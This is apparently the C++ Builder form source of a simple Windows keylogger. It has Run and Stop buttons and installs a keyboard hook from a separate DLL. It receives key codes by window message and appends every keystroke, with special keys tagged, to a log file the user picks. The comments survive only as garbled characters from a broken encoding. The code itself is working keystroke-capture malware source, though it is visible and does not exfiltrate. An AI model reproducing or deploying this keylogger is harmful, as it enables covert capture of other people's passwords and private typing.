//---------------------------------------------------------------------------
#include <windows.h>
#include <fstream>
#include <vcl.h>
#pragma comment (lib, "../Hook/Hook.lib") //���������� �������� ����

#define IMPORT extern "C" __declspec (dllimport) //������������ ������ ���������
                                                 //��������� ������� ��� ���������� �������
#pragma hdrstop
#include "Keylogger.h"
//---------------------------------------------------------------------------
#pragma package(smart_init)
#pragma resource "*.dfm"

using namespace std;
TForm1 *Form1;

bool work = false; //��� �������� �������� ������������ �� �
bool hook = false; //��� �������� �� ��� ������������ ���
ofstream fout; //����� ����� � ���� ���������������� ����������

IMPORT BOOL SetKeyboardHook(void); // ������������ ������� �� DLL ��� ������������ ������
//---------------------------------------------------------------------------
__fastcall TForm1::TForm1(TComponent* Owner)
        : TForm(Owner)
{
}
//---------------------------------------------------------------------------
//������� ������� ���������� �� ����������� �� ����
void __fastcall TForm1::OnWMCopyData(TMessage &Msg) {
        
        if(work) { //���� ������������ ��������
            int mes = LOWORD(Msg.WParam); //������� �� ����������� ��� �������
            //���� ���� �� ��������, ������� ��� �������� � �����
            if(!fout.is_open()) fout.open(Label1->Caption.c_str(),ios_base::app);
            switch(mes){ //������� ���� ������

            //��������� ��������� ���, ��������� �� �������� ������ �� �������� �������� � ����
             case 300: fout << endl  ; break; //�����
             case 301: fout <<" <BACKSPACE> "  ; break;
             case 302: fout << " <TAB> "  ; break;
             case 303: break; //Shift
             case 304: fout << " <Ctrl> " ; break;
             case 305: fout << " <ALT> " ; break;
             case 306: fout << " <Pause> " ; break;
             case 307: fout << " <CAPS_LOCK> " ; break;
             case 308: fout << " <ESC> " ; break;
             case 309: fout << " <PAGE_UP> " ; break;
             case 310: fout << " <PAGE_DOWN> " ; break;
             case 311: fout << " <END> " ; break;
             case 312: fout << " <HOME> " ; break;
             case 313: fout << " <LEFT_ARROW> " ; break;
             case 314: fout << " <UP_ARROW> " ; break;
             case 315: fout << " <RIGHT_ARROW> " ; break;
             case 316: fout << " <DOWN_ARROW> " ; break;
             case 317: fout << " <PRINT_SCREEN> " ; break;
             case 318: fout << " <Insert> " ; break;
             case 319: fout << " <Delete> " ; break;
             case 320: fout << " <L_Window> " ; break;
             case 321: fout << " <R_Window> " ; break;

             case 401: fout << " <F1> " ; break;
             case 402: fout << " <F2> " ; break;
             case 403: fout << " <F3> " ; break;
             case 404: fout << " <F4> " ; break;
             case 405: fout << " <F5> " ; break;
             case 406: fout << " <F6> " ; break;
             case 407: fout << " <F7> " ; break;
             case 408: fout << " <F8> " ; break;
             case 409: fout << " <F9> " ; break;
             case 410: fout << " <F10> " ; break;
             case 411: fout << " <F11> " ; break;
             case 412: fout << " <F12> " ; break;
             default: fout << (char)mes; //���� � ������ �� ������, ��� �� ������ � �������� ���� � ���� �� ������
            }
            fout.close(); //������� ����
   }
}
//---------------------------------------------------------------------------
//�������� ���������� �� ������ ���������
void __fastcall TForm1::RunClick(TObject *Sender)
{
        work=true; //������������ ��������
        Run->Enabled=false; //�������� ������ �������
        Stop->Enabled=true; //�������� ������ �������
        Button1->Enabled=false; //�������� ������� ������ �����
        try{ //������ ������� �������� ����
           fout.open(Label1->Caption.c_str(),ios_base::app);
        } catch(int){ //���� �� ������� ������� �������� �����������
           ShowMessage("������� � ����� �����!");
        }
        if(!hook){
           if(!SetKeyboardHook()) // ���������� ������
                Close(); // ���� �� ������������ �����
           hook=true; //���������� �� ������������ ��������
        }
}
//---------------------------------------------------------------------------
//�������� ���������� �� ��������
void __fastcall TForm1::StopClick(TObject *Sender)
{
        work=false; //������������ ��������
        Run->Enabled=true; //�������� ������ �������
        Stop->Enabled=false; //�������� ������ �������
        Button1->Enabled=true; //�������� ������ ������ �����
}
//---------------------------------------------------------------------------
//�������� ���������� �� ������� ����
void __fastcall TForm1::Button1Click(TObject *Sender)
{
    if (SaveDialog1->Execute()) //������� ����� ����������
    {
        String path = SaveDialog1->FileName; //�������� ������ ���� �� �����
        //������� � ����� ����� ������� ����� �� ������
        path = StringReplace(path,"\\","\\\\",TReplaceFlags()<<rfReplaceAll);
        Label1->Caption = path; //������� ���� �� �����
    }
}
//---------------------------------------------------------------------------


